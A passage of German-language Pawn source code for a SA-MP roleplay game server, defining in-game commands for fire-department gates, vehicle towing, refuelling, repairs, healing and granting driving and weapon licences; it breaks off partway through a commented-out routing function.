		    MoveDynamicObject(medictorls[0],1731.19287, -9314.26758, 4.90920,1,   0.00000, 180.00000, -90.00000);
		    SendClientMessage(playerid,COLOR_RED,"Tor 4 geschlossen");

     	}
	}
	else if(nummer == 5)
	{
	    if(TOROFFEN[10] == 0)
	    {
		  	TOROFFEN[10] = 1;
          	MoveDynamicObject(medictorls[2],1725.39087, -9316.0780, 6.9420,1,    0.0000, 270.0000, -90.0000);
		  	SendClientMessage(playerid,COLOR_GREEN,"Tor 5 geöffnet");
		}
		else
		{
		    TOROFFEN[10] = 0;
		    MoveDynamicObject(medictorls[2],1725.39087, -9314.26758, 4.90920,1,   0.00000, 180.00000, -90.00000);
		    SendClientMessage(playerid,COLOR_RED,"Tor 5 geschlossen");

     	}
	}
	else SendClientMessage(playerid,COLOR_RED,"Benutze /frmls [1-5]");
	return 1;
}
//FEUERWEHR LS TORE
cmd:frfls(playerid,params[])
{
    printf("%s frfls",PlayerName(playerid));
	new nummer;
	if(!IstSpielerInFrak(playerid,3) && !IstSpielerInFrak(playerid,4)) return SendClientMessage(playerid,COLOR_RED,"Du bist kein Mitglied des Fire & Rescue Departments!");
	if(sscanf(params, "d", nummer)) return SendClientMessage(playerid,COLOR_RED,"Benutze /frfls [1-6]");
 	if(nummer == 1)
	{
    	if(TOROFFEN[11] == 0)
	    {
		  	TOROFFEN[11] = 1;
          	MoveDynamicObject(LSFWTORE[0],1770.3701, -9361.2773, 6.8854,1, 0.0000, 90.0000, 0.0000);
		  	SendClientMessage(playerid,COLOR_GREEN,"Tor 1 geöffnet");
		}
		else
		{
		    TOROFFEN[11] = 0;
		    MoveDynamicObject(LSFWTORE[0],1771.93213, -9361.27734, 4.90920,1,0.00000, 180.00000, 0.00000);
		    SendClientMessage(playerid,COLOR_RED,"Tor 1 geschlossen");

     	}
	}
	else if(nummer == 2)
	{
	    if(TOROFFEN[12] == 0)
	    {
		  	TOROFFEN[12] = 1;
          	MoveDynamicObject(LSFWTORE[1],1770.3701, -9355.4785, 6.8854,1, 0.0000, 90.0000, 0.0000);
		  	SendClientMessage(playerid,COLOR_GREEN,"Tor 2 geöffnet");

		}
		else
		{
		    TOROFFEN[12] = 0;
		    MoveDynamicObject(LSFWTORE[1],1771.9321, -9355.4785, 4.9092,1,0.00000, 180.00000, 0.00000);
		    SendClientMessage(playerid,COLOR_RED,"Tor 2 geschlossen");

     	}
	}
	else if(nummer == 3)
	{
	    if(TOROFFEN[13] == 0)
	    {
		  	TOROFFEN[13] = 1;
          	MoveDynamicObject(LSFWTORE[2],1770.3701, -9349.7178, 6.8854,1, 0.0000, 90.0000, 0.0000);
		  	SendClientMessage(playerid,COLOR_GREEN,"Tor 3 geöffnet");

		}
		else
		{
		    TOROFFEN[13] = 0;
		    MoveDynamicObject(LSFWTORE[2],1771.9321, -9349.7178, 4.9092,1,0.00000, 180.00000, 0.00000);
		    SendClientMessage(playerid,COLOR_RED,"Tor 3 geschlossen");

     	}
	}
	else if(nummer == 6)
	{
	    if(TOROFFEN[14] == 0)
	    {
		  	TOROFFEN[14] = 1;
          	MoveDynamicObject(LSFWTORE[3],1770.3701, -9332.3799, 6.8854,1, 0.0000, 90.0000, 0.0000);
		  	SendClientMessage(playerid,COLOR_GREEN,"Tor 6 geöffnet");

		}
		else
		{
		    TOROFFEN[14] = 0;
		    MoveDynamicObject(LSFWTORE[3],1771.9321, -9332.3799, 4.9092,1,0.00000, 180.00000, 0.00000);
		    SendClientMessage(playerid,COLOR_RED,"Tor 6 geschlossen");

     	}
	}
	else if(nummer == 5)
	{
		if(TOROFFEN[15] == 0)
	    {
		  	TOROFFEN[15] = 1;
          	MoveDynamicObject(LSFWTORE[4],1770.3701, -9338.1699, 6.8854,1, 0.0000, 90.0000, 0.0000);
		  	SendClientMessage(playerid,COLOR_GREEN,"Tor 5 geöffnet");

		}
		else
		{
		    TOROFFEN[15] = 0;
		    MoveDynamicObject(LSFWTORE[4],1771.9321, -9338.1699, 4.9092,1,0.00000, 180.00000, 0.00000);
		    SendClientMessage(playerid,COLOR_RED,"Tor 5 geschlossen");

     	}
	}
 	else if(nummer == 4)
 	{
		if(TOROFFEN[16] == 0)
	    {
		  	TOROFFEN[16] = 1;
          	MoveDynamicObject(LSFWTORE[5],1770.3701, -9343.9307, 6.8854,1, 0.0000, 90.0000, 0.0000);
		  	SendClientMessage(playerid,COLOR_GREEN,"Tor 4 geöffnet");

		}
		else
		{
		    TOROFFEN[16] = 0;
		    MoveDynamicObject(LSFWTORE[5],1771.9321,-9343.9307, 4.9092,1,0.00000, 180.00000, 0.00000);
		    SendClientMessage(playerid,COLOR_RED,"Tor 4 geschlossen");

     	}
	}
	else SendClientMessage(playerid,COLOR_RED,"Benutze /frfls [1-6]");
	return 1;
}



cmd:frmsf(playerid,params[])
{
    printf("%s frmsf",PlayerName(playerid));
	new nummer;
	if(!IstSpielerInFrak(playerid,3) && !IstSpielerInFrak(playerid,4))return SendClientMessage(playerid,COLOR_RED,"Du bist kein Mitglied des Fire & Rescue Departments!");
	if(sscanf(params, "d", nummer))return SendClientMessage(playerid,COLOR_RED,"Benutze /frmsf [1-5]");
	if(nummer == 2)
	{
    	MoveDynamicObject(sfmedictore[0],6452.29492, -7742.89600, 7.34050, 2,  0.00000, 90.00000, 0.00000);
    	SetTimerEx("McTorClose1",10000,0,"d");
	}
	else if(nummer == 3)
	{
    	MoveDynamicObject(sfmedictore[1],6452.29492, -7748.09863, 7.34050, 2,  0.00000, 90.00000, 0.00000);
    	SetTimerEx("McTorClose2",10000,0,"d");
	}
	else if(nummer == 4)
	{
    	MoveDynamicObject(sfmedictore[2],6449.11035, -7751.27539, 7.34050,2,   0.00000, -90.00000, 90.00000);
    	SetTimerEx("McTorClose3",10000,0,"d");
	}
	else if(nummer == 5)
	{
    	MoveDynamicObject(sfmedictore[3],6443.91113, -7751.27539, 7.34050,  2, 0.00000, -90.00000, 90.00000);
    	SetTimerEx("McTorClose4",10000,0,"d");
 	}
	else if(nummer == 1)
	{
    	MoveDynamicObject(sfmedictore[4],6452.29492, -7737.71826, 7.34050,   2,0.00000, 90.00000, 0.00000);
    	SetTimerEx("McTorClose5",10000,0,"d");
	}
	else{SendClientMessage(playerid,COLOR_RED,"Benutze /frmsf [1-5]");}
	return 1;
}
forward McTorClose1();
public McTorClose1()
{
    MoveDynamicObject(sfmedictore[0],6452.29492, -7742.89600, 5.37230,2,   0.00000, 180.00000, 0.00000);
}
forward McTorClose2();
public McTorClose2()
{
    MoveDynamicObject(sfmedictore[1],6452.29492, -7748.09863, 5.37230,2,   0.00000, 180.00000, 0.00000);
}
forward McTorClose3();
public McTorClose3()
{
    MoveDynamicObject(sfmedictore[2], 6449.11035, -7751.27539, 5.37230,2,   0.00000, 180.00000, 90.00000);
}
forward McTorClose4();
public McTorClose4()
{
    MoveDynamicObject(sfmedictore[3], 6443.91113, -7751.27539, 5.37230,2,   0.00000, 180.00000, 90.00000);
}
forward McTorClose5();
public McTorClose5()
{
    MoveDynamicObject(sfmedictore[4],6452.29492, -7737.71826, 5.37230,2,   0.00000, 180.00000, 0.00000);
}
cmd:autosperren(playerid,params[])
{
    printf("%s autosperren",PlayerName(playerid));
    if(!IstSpielerInFrak(playerid,3) && !IstSpielerInFrak(playerid,4))return SendClientMessage(playerid,COLOR_RED,"Du bist kein Mitglied des Fire & Rescue Departments!");
    if(IsPlayerInArea(playerid,1690.6553,-9385.7988,1752.4286,-9343.9883))
    {
	    if(!IsPlayerInAnyVehicle(playerid)) return SendClientMessage(playerid,COLOR_RED,"Du sitzt in keinem Fahrzeug!");
	    new vehicleid = GetPlayerVehicleID(playerid);
	    for(new i = 0; i < MAX_PLAYERS; i++)
	    {
	        for(new x = 0; x < 2; x++)
	        {
	            if(vehicleid == SAuto[i][x][sID])
	            {
	                SAuto[i][x][abgeschleppt] = 1;
	                SendClientMessage(i,COLOR_YELLOW,"Ein Fahrzeug von dir wurde abgeschleppt!");
	                SendClientMessage(playerid,COLOR_GREEN,"Fahrzeug gesperrt!");
	                return 1;
	            }
	        }
	    }
	    for(new x = 1; x < 18; x++)
		{
		    for(new y = 0; y < 20; y++)
		    {
		        if(FrakFahrzeuge[x][y][FID] == vehicleid)
		        {
		        	FrakFahrzeuge[x][y][FAbgeschleppt] = 1;
		        	SendClientMessage(playerid,COLOR_GREEN,"Fahrzeug gesperrt!");
		        	new Float:X,Float:Y,Float:Z,Float:RZ;
		        	GetVehiclePos(FrakFahrzeuge[x][y][FID],X,Y,Z);
		        	GetVehicleZAngle(FrakFahrzeuge[x][y][FID],RZ);
		        	new string[150];
					format(string,sizeof string,"UPDATE `frakautos` SET ADACX='%.2f',ADACY='%.2f',ADACZ='%.2f',ADACRZ='%.2f',Abgeschleppt='1' WHERE Fraktion='%d',ID='%d'",X,Y,Z,RZ,x,y);
					mysql_query(dbhandle, string);
					printf("%s",string);
		        	return 1;
	        	}
	    	}
		}
	}else{SendClientMessage(playerid,COLOR_RED,"Du bist nicht in der ADACZone!");}
	return 1;
}
cmd:betanken(playerid,params[]) CallLocalFunction("cmd_auftanken","d",playerid);
cmd:auftanken(playerid,params[])
{
    printf("%s auftanken",PlayerName(playerid));
    if(!IstSpielerInFrak(playerid,3) && !IstSpielerInFrak(playerid,4))return SendClientMessage(playerid,COLOR_RED,"Du bist kein Mitglied des Fire & Rescue Departments!");
    if(IsPlayerInAnyVehicle(playerid)) return SendClientMessage(playerid,COLOR_RED,"Du befindest dich in einem Fahrzeug!");
	new Float:betrag,string[110];
	if(sscanf(params,"rf",giveplayerid,betrag)) return SendClientMessage(playerid,COLOR_RED,"Benutze /auftanken [Name/ID] [Preis]");
	if(EntfernungZwischenSpielern(playerid,giveplayerid) > 5) return SendClientMessage(playerid,COLOR_RED,"Der Spieler ist zu weit entfernt!");
	if(betrag < 0.01 && betrag > 1000) return SendClientMessage(playerid,COLOR_RED,"Gebe einen Betrag zwischen 1Cent und 1000$ ein!");
	if(!IsPlayerInAnyVehicle(giveplayerid)) return SendClientMessage(playerid,COLOR_RED,"Du Spieler befindest sich nicht in einem Fahrzeug!");
	format(string,sizeof string,"%s hat dir angeboten dein Fahrzeug für %.2f$ zu betanken. Benutze /annehmen",PlayerName(playerid),betrag);
	SendClientMessage(giveplayerid,COLOR_GREEN,string);
	format(string,sizeof string,"Du bietest %s an sein Fahrzeug für %.2f$ zu betanken.",PlayerName(giveplayerid),betrag);
	SendClientMessage(playerid,COLOR_GREEN,string);
	Auftrag[giveplayerid][0] = playerid;
	Auftrag[giveplayerid][1] = betrag;
	return 1;
}
cmd:reparatur(playerid,params[])
{
    printf("%s reperatur",PlayerName(playerid));
    if(!IstSpielerInFrak(playerid,3) && !IstSpielerInFrak(playerid,4))return SendClientMessage(playerid,COLOR_RED,"Du bist kein Mitglied des Fire & Rescue Departments!");
    if(IsPlayerInAnyVehicle(playerid)) return SendClientMessage(playerid,COLOR_RED,"Du befindest dich in einem Fahrzeug!");
	new Float:betrag,string[110];
	if(sscanf(params,"rf",giveplayerid,betrag)) return SendClientMessage(playerid,COLOR_RED,"Benutze /reparatur [Name/ID] [Preis]");
	if(EntfernungZwischenSpielern(playerid,giveplayerid) > 5) return SendClientMessage(playerid,COLOR_RED,"Der Spieler ist zu weit entfernt!");
	if(betrag < 0.01 && betrag > 1000) return SendClientMessage(playerid,COLOR_RED,"Gebe einen Betrag zwischen 1Cent und 1000$ ein!");
	if(!IsPlayerInAnyVehicle(giveplayerid)) return SendClientMessage(playerid,COLOR_RED,"Du Spieler befindest sich nicht in einem Fahrzeug!");
	format(string,sizeof string,"%s hat dir angeboten dein Fahrzeug für %.2f$ zu reparieren. Benutze /annehmen",PlayerName(playerid),betrag);
	SendClientMessage(giveplayerid,COLOR_GREEN,string);
	format(string,sizeof string,"Du bietest %s an sein Fahrzeug für %.2f$ zu reparieren.",PlayerName(giveplayerid),betrag);
	SendClientMessage(playerid,COLOR_GREEN,string);
	Auftrag[giveplayerid][0] = playerid+1000;
	Auftrag[giveplayerid][1] = betrag;
	return 1;
}
cmd:annehmen(playerid,params[])
{
    printf("%s annehmen",PlayerName(playerid));
	if(Auftrag[playerid][0] == -1) return SendClientMessage(playerid,COLOR_RED,"Keiner hat dir angeboten dein Fahrzeug zu betanken/reparieren!");
	giveplayerid = floatround(Auftrag[playerid][0]);
	new rep = 0;
	if(giveplayerid >= 1000) { giveplayerid-=1000; rep = 1; }
	if(EntfernungZwischenSpielern(playerid,giveplayerid) > 5) return SendClientMessage(playerid,COLOR_RED,"Du bist zu weit entfernt!");
	if(!IsPlayerInAnyVehicle(playerid)) return SendClientMessage(playerid,COLOR_RED,"Du befindest dich nicht in einem Fahrzeug!");
	if(IsPlayerInAnyVehicle(giveplayerid)) return SendClientMessage(playerid,COLOR_RED,"Der Fire & Rescue'ler befindest sich in einem Fahrzeug!");
	if(SpielerInfo[playerid][uGeld] < Auftrag[giveplayerid][1]) return SendClientMessage(playerid,COLOR_RED,"Du hast nicht genug Geld!");
	if(rep == 0)
	{
	    Benzin[GetPlayerVehicleID(playerid)] = AutoDaten[GetVehicleModel(GetPlayerVehicleID(playerid))-399][MaxBenzin];
		new string[20];
		format(string, sizeof(string), "%d/%dL",Benzin[GetPlayerVehicleID(playerid)],AutoDaten[GetVehicleModel(GetPlayerVehicleID(playerid))-399][MaxBenzin]);
		PlayerTextDrawSetString(playerid,TachoText[playerid][14],string);
		SendClientMessage(playerid,COLOR_GREEN,"Fahrzeug wurde betankt!");
		SendClientMessage(giveplayerid,COLOR_GREEN,"Fahrzeug betankt!");
	}
	else
	{
	    Reparieren(GetPlayerVehicleID(playerid));
	    SendClientMessage(playerid,COLOR_GREEN,"Fahrzeug wurde repariert!");
		SendClientMessage(giveplayerid,COLOR_GREEN,"Fahrzeug repariert!");
	}
	GebeGeld(playerid,-Auftrag[playerid][1]);
	GebeGeld(giveplayerid,Auftrag[playerid][1]);
	Auftrag[playerid][0] = -1;
	return 1;
}
cmd:heilen(playerid,params[])
{
    printf("%s heilen",PlayerName(playerid));
	new Float:preis,string[70];
	if(!IstSpielerInFrak(playerid,3) && !IstSpielerInFrak(playerid,4))return SendClientMessage(playerid,COLOR_RED,"Du bist kein Mitglied des Fire & Rescue Departments!");
	if(Medikamente[playerid] < 1) return SendClientMessage(playerid,COLOR_RED,"Du hast keine Medikamente bei dir!");
	if(sscanf(params,"rf",giveplayerid,preis)) return SendClientMessage(playerid,COLOR_RED,"Benutze /heilen [Name/ID] [Preis]");
	if(EntfernungZwischenSpielern(playerid,giveplayerid) > 4) return SendClientMessage(playerid,COLOR_RED,"Der Spieler ist nicht in deiner Nähe!");
	if(preis < 0.01) return SendClientMessage(playerid,COLOR_RED,"Der darf nicht weniger als 1 Cent betragen!");
	format(string,sizeof string,"%s bietet dir für %.2f$ eine Heilung an.",PlayerName(playerid),preis);
	ShowPlayerDialog(giveplayerid,DIALOG_HEILUNG,DIALOG_STYLE_MSGBOX,"Heilung",string,"Kaufen","Abbrechen");
	format(string,sizeof string,"Du bietest %s eine Heilung für %.2f$ an.",PlayerName(giveplayerid),preis);
	SendClientMessage(playerid,COLOR_LIGHTBLUE,string);
	Heilung[giveplayerid][hUser] = playerid;
	Heilung[giveplayerid][hBetrag] = preis;
	return 1;
}
cmd:verstrahlung(playerid,params[])
{
    printf("%s verstrahlen",PlayerName(playerid));
	if(!IstSpielerInFrak(playerid,3) && !IstSpielerInFrak(playerid,4))return SendClientMessage(playerid,COLOR_RED,"Du bist kein Mitglied des Fire & Rescue Departments!");
	for(new i = 0; i < GetMaxPlayers(); i++)
	{
	    if(SpielerInfo[i][uEingeloggt] == 1 && SpielerInfo[i][uVerstrahlt] == 1)
	    {
			SendFormatMessage(playerid,COLOR_ORANGE,"%s[ID:%i]",PlayerName(i),i);
		}
	}
	return 1;
}

cmd:theorie(playerid,params[])
{
    printf("%s theorie",PlayerName(playerid));
    if(!IstSpielerInFrak(playerid,6)) return SendClientMessage(playerid,COLOR_RED,"Du bist kein Fahrlehrer!");
	if(sscanf(params,"r",giveplayerid)) return SendClientMessage(playerid,COLOR_RED,"Benutze /theorie [Name/ID]");
	if(EntfernungZwischenSpielern(playerid,giveplayerid) > 5) return SendClientMessage(playerid,COLOR_RED,"Der Spieler befindet sich nicht in deiner Nähe!");
	new string[80];
	if(SpielerInfo[giveplayerid][uTheorie] == 0)
 	{
		format(string,sizeof string,"%s hat die theoretische Prüfung bisher nicht bestanden!",PlayerName(giveplayerid));
	 	SendClientMessage(playerid,COLOR_RED,string);
 	}
 	else
 	{
	 	format(string,sizeof string,"%s hat die theoretische Prüfung bestanden!",PlayerName(giveplayerid));
	 	SendClientMessage(playerid,COLOR_GREEN,string);
 	}
 	return 1;
}
cmd:gebeschein(playerid,params[])
{
    printf("%s gebeschein",PlayerName(playerid));
    if(!IstSpielerInFrak(playerid,6) && SpielerInfo[playerid][uAdmin] < 1) return SendClientMessage(playerid,COLOR_RED,"Du bist kein Fahrlehrer!");
    new string[100];
    if(sscanf(params,"rs[100]", giveplayerid,string)) return SendClientMessage(playerid,COLOR_RED,"Benutze /gebeschein [Name/ID] [Schein]");
    if(SpielerInfo[playerid][uAdmin] < 1 && EntfernungZwischenSpielern(playerid,giveplayerid) > 5) return SendClientMessage(playerid,COLOR_RED,"Der Spieler befindet sich nicht in deiner Nähe!");
    if(strcmp(string,"Führerschein",true) == 0)
	{
	    if(SpielerInfo[giveplayerid][uFuehrerschein] == 1) return SendClientMessage(playerid,COLOR_RED,"Dieser Spieler hat den Führerschein bereits!");
	    SpielerInfo[giveplayerid][uFuehrerschein] = 1;
	    format(string,sizeof string,"Du hast von %s den Führerschein bekommen.",PlayerName(playerid));
	    SendClientMessage(giveplayerid,COLOR_LIGHTBLUE,string);
	    format(string,sizeof string,"Du hast %s den Führerschein gegeben.",PlayerName(giveplayerid));
	    SendClientMessage(playerid,COLOR_LIGHTBLUE,string);
	}
	else if(strcmp(string,"Motorradschein",true) == 0)
	{
	    if(SpielerInfo[giveplayerid][uMotorradschein] == 1) return SendClientMessage(playerid,COLOR_RED,"Dieser Spieler hat den Motorradschein bereits!");
	    SpielerInfo[giveplayerid][uMotorradschein] = 1;
	    format(string,sizeof string,"Du hast von %s den Motorradschein bekommen.",PlayerName(playerid));
	    SendClientMessage(giveplayerid,COLOR_LIGHTBLUE,string);
	    format(string,sizeof string,"Du hast %s den Motorradschein gegeben.",PlayerName(giveplayerid));
	    SendClientMessage(playerid,COLOR_LIGHTBLUE,string);
	}
	else if(strcmp(string,"Rollerschein",true) == 0)
	{
	    if(SpielerInfo[giveplayerid][uRollerschein] == 1) return SendClientMessage(playerid,COLOR_RED,"Dieser Spieler hat den Rollerschein bereits!");
	    SpielerInfo[giveplayerid][uRollerschein] = 1;
	    format(string,sizeof string,"Du hast von %s den Rollerschein bekommen.",PlayerName(playerid));
	    SendClientMessage(giveplayerid,COLOR_LIGHTBLUE,string);
	    format(string,sizeof string,"Du hast %s den Rollerschein gegeben.",PlayerName(giveplayerid));
	    SendClientMessage(playerid,COLOR_LIGHTBLUE,string);
	}
	else if(strcmp(string,"Bootsschein",true) == 0)
	{
	    if(SpielerInfo[giveplayerid][uBootsschein] == 1) return SendClientMessage(playerid,COLOR_RED,"Dieser Spieler hat den Bootsschein bereits!");
	    SpielerInfo[giveplayerid][uBootsschein] = 1;
	    format(string,sizeof string,"Du hast von %s den Bootsschein bekommen.",PlayerName(playerid));
	    SendClientMessage(giveplayerid,COLOR_LIGHTBLUE,string);
	    format(string,sizeof string,"Du hast %s den Bootsschein gegeben.",PlayerName(giveplayerid));
	    SendClientMessage(playerid,COLOR_LIGHTBLUE,string);
	}
	else if(strcmp(string,"Helischein",true) == 0)
	{
	    if(SpielerInfo[giveplayerid][uHelischein] == 1) return SendClientMessage(playerid,COLOR_RED,"Dieser Spieler hat den Helischein bereits!");
	    SpielerInfo[giveplayerid][uHelischein] = 1;
	    format(string,sizeof string,"Du hast von %s den Helischein bekommen.",PlayerName(playerid));
	    SendClientMessage(giveplayerid,COLOR_LIGHTBLUE,string);
	    format(string,sizeof string,"Du hast %s den Helischein gegeben.",PlayerName(giveplayerid));
	    SendClientMessage(playerid,COLOR_LIGHTBLUE,string);
	}
	else if(strcmp(string,"LKWschein",true) == 0)
	{
	    if(SpielerInfo[giveplayerid][uLKWschein] == 1) return SendClientMessage(playerid,COLOR_RED,"Dieser Spieler hat den LKWschein bereits!");
	    SpielerInfo[giveplayerid][uLKWschein] = 1;
	    format(string,sizeof string,"Du hast von %s den LKWschein bekommen.",PlayerName(playerid));
	    SendClientMessage(giveplayerid,COLOR_LIGHTBLUE,string);
	    format(string,sizeof string,"Du hast %s den LKWschein gegeben.",PlayerName(giveplayerid));
	    SendClientMessage(playerid,COLOR_LIGHTBLUE,string);
	}
	else if(strcmp(string,"Waffenschein",true) == 0)
	{
	    if(SpielerInfo[giveplayerid][uWaffenschein] == 1) return SendClientMessage(playerid,COLOR_RED,"Dieser Spieler hat den Waffenschein bereits!");
	    SpielerInfo[giveplayerid][uWaffenschein] = 1;
	    format(string,sizeof string,"Du hast von %s den Waffenschein bekommen.",PlayerName(playerid));
	    SendClientMessage(giveplayerid,COLOR_LIGHTBLUE,string);
	    format(string,sizeof string,"Du hast %s den Waffenschein gegeben.",PlayerName(giveplayerid));
	    SendClientMessage(playerid,COLOR_LIGHTBLUE,string);
	}
	else if(SpielerInfo[playerid][uAdmin] > 0)
	{
		if(strcmp(string,"Perso",true) == 0)
		{
		    if(SpielerInfo[giveplayerid][uPerso] == 1) return SendClientMessage(playerid,COLOR_RED,"Dieser Spieler hat den Personalausweis bereits!");
		    SpielerInfo[giveplayerid][uPerso] = 1;
		    format(string,sizeof string,"Du hast von %s den Personalausweis bekommen.",PlayerName(playerid));
		    SendClientMessage(giveplayerid,COLOR_LIGHTBLUE,string);
		    format(string,sizeof string,"Du hast %s den Personalausweis gegeben.",PlayerName(giveplayerid));
		    SendClientMessage(playerid,COLOR_LIGHTBLUE,string);
		}
		else if(strcmp(string,"alle",true) == 0)
		{
		    SpielerInfo[giveplayerid][uLKWschein] = 1;
	     	SpielerInfo[giveplayerid][uFuehrerschein] = 1;
			SpielerInfo[giveplayerid][uMotorradschein] = 1;
			SpielerInfo[giveplayerid][uRollerschein] = 1;
			SpielerInfo[giveplayerid][uHelischein] = 1;
			SpielerInfo[giveplayerid][uBootsschein] = 1;
			SpielerInfo[giveplayerid][uWaffenschein] = 1;
		    format(string,sizeof string,"Du hast von %s alle Scheine bekommen.",PlayerName(playerid));
		    SendClientMessage(giveplayerid,COLOR_LIGHTBLUE,string);
		    format(string,sizeof string,"Du hast %s alle Scheine gegeben.",PlayerName(giveplayerid));
		    SendClientMessage(playerid,COLOR_LIGHTBLUE,string);
		}
		else
		{
			SendClientMessage(playerid,COLOR_RED,"Verfügbare Scheine: Führerschein,Motorradschein,Rollerschein,Bootsschein,Helischein,LKWSchein,Waffenschein,Alle,Perso");
		}
	}
	else
	{
		if(SpielerInfo[playerid][uAdmin] > 0) return SendClientMessage(playerid,COLOR_RED,"Verfügbare Scheine: Führerschein,Motorradschein,Rollerschein,Bootsschein,Helischein,LKWSchein,Waffenschein,Alle,Perso");
		else return SendClientMessage(playerid,COLOR_RED,"Verfügbare Scheine: Führerschein,Motorradschein,Rollerschein,Bootsschein,Helischein,LKWSchein,Waffenschein");
	}
	return 1;
}
cmd:zeiger(playerid,params[])
{
    printf("%s zeiger",PlayerName(playerid));
    ShowPlayerDialog(playerid,DIALOG_AKTIONEN,DIALOG_STYLE_LIST,"Wähle aus:","Objekt-Zeiger\nTextdraw-Zeiger","Okay","Abbrechen");
    return 1;
}
/*cmd:attach(playerid,params[])
{
	if(GetVehicleModel(GetPlayerVehicleID(playerid)) != 530)
	{
		//AttachDynamicObjectToVehicle(AttachObject[0],GetPlayerVehicleID(playerid),0.000,3.600,1.400,0,0,0);
		new Float:X,Float:Y,Float:Z,Float:RX,Float:RY,Float:RZ;
		GetDynamicObjectPos(AttachObject[0],X,Y,Z);
	 	GetDynamicObjectRot(AttachObject[0],RX,RY,RZ);
		//AttachDynamicObjectToVehicle(AttachObject[0],GetPlayerVehicleID(playerid),X-3876.42, Y+728.18, Z-11.64, RX, RY, RZ);
		for(new x = 1; x < sizeof(AttachObject); x++)
		{
		    //SetDynamicObjectMaterialText(AttachObject[x],0," ",OBJECT_MATERIAL_SIZE_256x128,"Arial",24,1,0x00FFFFFF,0xFFFF0000);   //Rot
		    SetDynamicObjectMaterial(AttachObject[x],0,4,"civic04_lan","forumstand1_LAe");
		    GetDynamicObjectPos(AttachObject[x],X,Y,Z);
		    GetDynamicObjectRot(AttachObject[x],RX,RY,RZ);
			AttachDynamicObjectToVehicle(AttachObject[x],GetPlayerVehicleID(playerid),X-3876.42, Y+728.18, Z-11.64, RX, RY, RZ);
		}
	}
	else
	{
	    new object = CreateDynamicObject(2932, 2617.07, -2403.35, 14.12,  0.00, 0.00, 90.00);
	    AttachDynamicObjectToVehicle(object,GetPlayerVehicleID(playerid),-0.25,2.68,1.1, 0, 0, 90);
	}
	return 1;
}
cmd:rampe(playerid,params[])
{
	new Float:X,Float:Y,Float:Z,Float:RX,Float:RY,Float:RZ;
	GetDynamicObjectRot(AttachObject[1],RX,RY,RZ);
	if(RY != 70)
	{
		X = 3876.4861;
		Y = -735.4369;
		Z = 10.8201;
		RY = 70.00;
		new Float:VX,Float:VY,Float:VZ,Float:V2X,Float:V2Y,Float:V2Z;
		GetVehiclePos(GetPlayerVehicleID(playerid),VX,VY,VZ);
		for(new v = 0; v < MAX_VEHICLES; v++)
		{
			if(IsValidVehicle(v) && IsVehicleInRangeOfPoint(v,3.0,X,Y,Z+0.6) && v != GetPlayerVehicleID(playerid))
			{
			    GetVehiclePos(v,V2X,V2Y,V2Z);
			    if(V2Z > VZ+0.6)
			    {
			        ADACVehicleStream[v] = -1;
			        RemovePlayerFromVehicle(ADACBot);
			    }
			}
		}
	}
	else
	{
		X = 3876.45;
		Y = -733.74;
		Z = 13.06;
		RY = 0.00;
		new Float:VX,Float:VY,Float:VZ,Float:V2X,Float:V2Y,Float:V2Z;
		GetVehiclePos(GetPlayerVehicleID(playerid),VX,VY,VZ);
		for(new v = 0; v < MAX_VEHICLES; v++)
		{
			if(IsValidVehicle(v) && v != GetPlayerVehicleID(playerid) && IsVehicleInRangeOfPoint(v,3.0,VX,VY,VZ+0.6))
			{
			    SendClientMessage(playerid,COLOR_GREEN,"Fahrzeug in der Nähe gefunden!");
			    GetVehiclePos(v,V2X,V2Y,V2Z);
			    if(V2Z > VZ+0.4)
			    {
                    SendClientMessage(playerid,COLOR_GREEN,"Fahrzeug wird abgeschleppt!");
                    ADACVehicleStream[v] = playerid;
                    Teleport(ADACBot,V2X,V2Y,V2Z);
                    PutPlayerInVehicle(ADACBot,v,0);
			        break;
			    }
			}
		}
	}
	SetDynamicObjectRot(AttachObject[1],0.00, RY, 90.00);
 	AttachDynamicObjectToVehicle(AttachObject[1],GetPlayerVehicleID(playerid),X-3876.42, Y+728.18, Z-11.64, 0.00, RY, 90.00);
 	return 1;
}*/
/*cmd:addpoint(playerid,params[])
{
	new Float:X,Float:Y,Float:Z,string[100];
	GetPlayerPos(playerid,X,Y,Z);
	format(string,sizeof string,"INSERT INTO nodes SET ID='%d',X='%.2f',Y='%.2f',Z='%.2f'",points,X,Y,Z);
	mysql_query(dbhandle, string);
	format(string,sizeof string,"Node %d erstellt!",points);
	SendClientMessage(playerid,COLOR_GREEN,string);
	Create3DTextLabel(string, 0x008080FF, X, Y, Z, 40.0, 0, 0);
	points++;
	return 1;
}*/
cmd:radio(playerid,params[])
{
    printf("%s radio",PlayerName(playerid));
	if(!IsPlayerInAnyVehicle(playerid)) return SendClientMessage(playerid,COLOR_RED,"Du kannst nur in deinem Fahrzeug Radio hören.");
	ShowPlayerDialog(playerid,DIALOG_RADIO,DIALOG_STYLE_LIST,"Radio","County Islands Radio\nCounty Islands Radio\nCounty Islands Radio\nTechnobase.fm\nHousetime.fm\nHardbase.fm\nTrancebase.fm\nCoretime.fm\nClubtime.fm\nElectro House\nHard.fm\nRadio aus","Hören","Abbrechen");
 	return 1;
}
/*cmd:connect(playerid,params[])
{
	new string[100],id,id2;
	if(sscanf(params,"dd",id,id2)) return SendClientMessage(playerid,COLOR_RED,"Benutze /connect [Node1] [Node2]");
	format(string,sizeof string,"UPDATE nodes SET Connection1='%d' WHERE ID='%d'",id,id2);
	mysql_query(dbhandle, string);
	format(string,sizeof string,"UPDATE nodes SET Connection1='%d' WHERE ID='%d'",id2,id);
	mysql_query(dbhandle, string);
	format(string,sizeof string,"Node %d mit %d connectet!",id,id2);
	SendClientMessage(playerid,COLOR_GREEN,string);
	return 1;
}
cmd:route(playerid,params[])//keine funktion
{
	new ziel = 3,string[20],id[3],id0[3],id1[3],id2[3],data[2];
	format(string,sizeof string,"ID='%d'",ziel);
	mysqlget("nodes",string,"Connection1",data);
	id[0] = strval(data);
	mysqlget("nodes",string,"Connection2",data);
	id[1] = strval(data);
	mysqlget("nodes",string,"Connection3",data);
	id[2] = strval(data);
	while(id[0] != ziel && id[1] != ziel && id[2] != ziel)
	{
	    if(id[0] != -1)
	    {
		    format(string,sizeof string,"ID='%d'",id[0]);
			mysqlget("nodes",string,"Connection1",data);
			id0[0] = strval(data);
			mysqlget("nodes",string,"Connection2",data);
			id0[1] = strval(data);
			mysqlget("nodes",string,"Connection3",data);
			id0[2] = strval(data);
		}
		if(id[1] != -1)
	    {
		    format(string,sizeof string,"ID='%d'",id[1]);
			mysqlget("nodes",string,"Connection1",data);
			id1[0] = strval(data);
			mysqlget("nodes",string,"Connection2",data);
			id1[1] = strval(data);
			mysqlget("nodes",string,"Connection3",data);
